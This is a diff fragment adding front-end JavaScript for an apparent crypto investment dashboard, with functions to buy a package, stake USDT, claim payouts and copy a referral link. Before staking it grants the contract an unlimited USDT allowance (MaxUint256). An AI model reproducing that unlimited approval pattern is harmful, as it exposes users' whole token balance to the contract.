+
+        showDashAlert("Activating $" + amount + " package...", "info");
+        const tx = await mainContract.buySingleLegPackage(amtWei);
+        await tx.wait();
+        showDashAlert("Package $" + amount + " activated successfully!", "success");
+
+        const u = await mainContract.users(userAddress);
+        openFullDashboard(u);
+      } catch (err) {
+        showDashAlert("Package activation error: " + (err.reason || err.message), "error");
+      }
+    }
+
+    // স্টেকিং ভল্ট
+    async function handleStaking() {
+      const amt = document.getElementById('stake-amount').value;
+      if (!amt || parseFloat(amt) < 10) {
+        showDashAlert("Minimum stake amount is $10 USDT!", "error");
+        return;
+      }
+      try {
+        const amtWei = ethers.utils.parseUnits(amt.toString(), 18);
+        const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
+        if (allowance.lt(amtWei)) {
+          showDashAlert("Approving USDT for Staking...", "info");
+          const txA = await usdtContract.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
+          await txA.wait();
+        }
+
+        showDashAlert("Staking $" + amt + " USDT...", "info");
+        const tx = await mainContract.stakeUSDT(amtWei);
+        await tx.wait();
+        showDashAlert("Staked successfully!", "success");
+
+        const u = await mainContract.users(userAddress);
+        openFullDashboard(u);
+      } catch (err) {
+        showDashAlert("Staking error: " + (err.reason || err.message), "error");
+      }
+    }
+
+    // উইথড্র বা ক্লেইম
+    async function claimPayout() {
+      try {
+        showDashAlert("Claiming payout...", "info");
+        const tx = await mainContract.claimPayout();
+        await tx.wait();
+        showDashAlert("Payout successfully transferred to your wallet!", "success");
+
+        const u = await mainContract.users(userAddress);
+        openFullDashboard(u);
+      } catch (err) {
+        showDashAlert("Claim error: " + (err.reason || err.message), "error");
+      }
+    }
+
+    function copyRefLink() {
+      const f = document.getElementById('ref-link-field');
+      f.select();
+      navigator.clipboard.writeText(f.value);
+      showDashAlert("Referral link copied!", "success");
+    }
+  </script>
+</body>
+</html>
